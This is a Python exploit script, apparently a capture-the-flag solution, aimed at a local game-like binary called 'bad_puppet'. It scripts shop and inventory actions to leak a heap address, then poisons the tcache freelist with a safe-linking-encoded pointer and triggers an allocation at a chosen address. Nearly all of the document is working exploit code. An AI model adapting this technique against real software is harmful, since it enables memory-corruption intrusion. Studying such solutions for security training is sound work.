#!/usr/bin/env python3
import subprocess, time, re, struct, sys, os, select
TARGET=int(sys.argv[1],16) if len(sys.argv)>1 else 0x4141414141414141
p=subprocess.Popen(["./libs/ld-linux-x86-64.so.2","--library-path","./libs","./bad_puppet","--stdio"],
    stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT,bufsize=0,cwd="/tmp/bp")
def rx(pats,timeout=2.0):
    if isinstance(pats,str): pats=[pats]
    end=time.time()+timeout; out=b""
    while time.time()<end:
        r,_,_=select.select([p.stdout],[],[],max(0.02,end-time.time()))
        if not r: break
        d=os.read(p.stdout.fileno(),65536)
        if not d: out+=b"<EOF>"; break
        out+=d
        if any(x in out.decode('utf-8','replace') for x in pats): break
    return out.decode('utf-8','replace')
def cmd(c,pats,t=2.0):
    try: p.stdin.write(c.encode()+b"\n"); p.stdin.flush()
    except Exception: return "<DEAD>"
    return rx(pats,t)
def items():
    o=cmd("inv list",["Inventory","<EOF>"],1.0); time.sleep(0.05)
    return [(int(m.group(1)),int(m.group(2)),m.group(3).strip(),m.group(4).strip())
            for m in re.finditer(r"\[(\d+)\]\s+#(\d+)\s+([^|]+)\|\s+type=([^|]+)\|",o)]
def show(): return cmd("mw show",["Drops:","<EOF>"],1.0)
rx(["Great Plateau"],3)
for i in range(5):
    cmd("shop buy 1 1",["tx: item added","not enough"]); cmd("inv equip 1",["tx: main world equipped","invalid"])
    cmd("shop sell 1",["shop sold","invalid"]); cmd("mw throw 0",["throws equipped item","invalid"])
    cmd("mw pickup 0",["tx: item added","invalid"]); cmd("shop sell 1",["shop sold","invalid"])
    time.sleep(0.1)
cmd("shop buy 3 34",["tx:","not enough"],3)
cmd("map teleport castle",["Encounter"]); cmd("battle",["player turn"])
cmd("use item",["Enter inventory idx"]); cmd("1",["Enter quantity"]); cmd("34",["Battle won"],4)
cmd("mw pickup 0",["tx: item added","invalid"]); cmd("inv equip 1",["tx: main world equipped","invalid"])
o=show(); m=re.search(r"description_addr=0x([0-9a-f]+)",o)
if not m: print("[x] no ring"); sys.exit(1)
base=int(m.group(1),16); print("[base] 0x%x"%base,flush=True)
# drop branch
cmd("inv drop 0",["tx: inventory frees","invalid"],2); time.sleep(0.6)
# buy bomb
cmd("shop buy 3 1",["tx:","not enough"],2); time.sleep(0.4)
it=items(); print("[B] "+str(it),flush=True)
rs=[x[0] for x in it if "The Ring" in x[2]]
if not rs: print("[x] no ring"); sys.exit(1)
# drop ring -> base into txn tcache
cmd("inv drop %d"%rs[0],["tx: inventory frees","invalid"],2); time.sleep(0.6)
fd=TARGET^(base>>12)
cmd("mw whisper 0 "+struct.pack("<Q",fd).hex(),["whispered","only"],3)
o=show(); mm=re.search(r"description_head=0x([0-9a-f]+)",o)
print("[poison] "+(mm.group(1) if mm else "?")+" expect "+hex(fd),flush=True)
# pickup ring clone (drop index 1: [branch, ring])
cmd("mw pickup 1",["tx: item added","invalid"],2); time.sleep(0.6)
it=items(); print("[C] "+str(it),flush=True)
bs=[x[0] for x in it if "Bomb" in x[3]]; rg=[x[0] for x in it if "The Ring" in x[2]]
if not bs or not rg: print("[x] setup fail"); sys.exit(1)
# BACKLOG: buy 4 swords and drop them fast (fills txn queue)
for _ in range(4): cmd("shop buy 0 1",["tx: item added","not enough"],1.5)
time.sleep(0.2)
it=items(); sw=[x[0] for x in it if "Sword" in x[3] and "Traveler" in x[2]]
print("[swords] %s"%sw,flush=True)
buf=""
for s_ in sw: buf+="inv drop %d\n"%s_
buf+="inv drop %d\ninv sort\n"%bs[0]
p.stdin.write(buf.encode()); p.stdin.flush()
o=rx(["<EOF>"],1.5)
print("[dec+backlog] "+repr(o[-300:]),flush=True)
o=show(); mm=re.search(r"description_head=0x([0-9a-f]+)",o)
print("[head after] "+(mm.group(1) if mm else "?")+" want 0x%x"%TARGET,flush=True)
it=items(); rg=[x[0] for x in it if "The Ring" in x[2]]
print("[D] "+str(it),flush=True)
if rg:
    o=cmd("inv drop %d"%rg[0],["tx: inventory frees","invalid","<EOF>"],2)
    print("[pop] "+repr(o[-180:]),flush=True)
o=rx(["<EOF>"],0.8); print("[final] "+repr(o[:100]),flush=True)
p.kill()
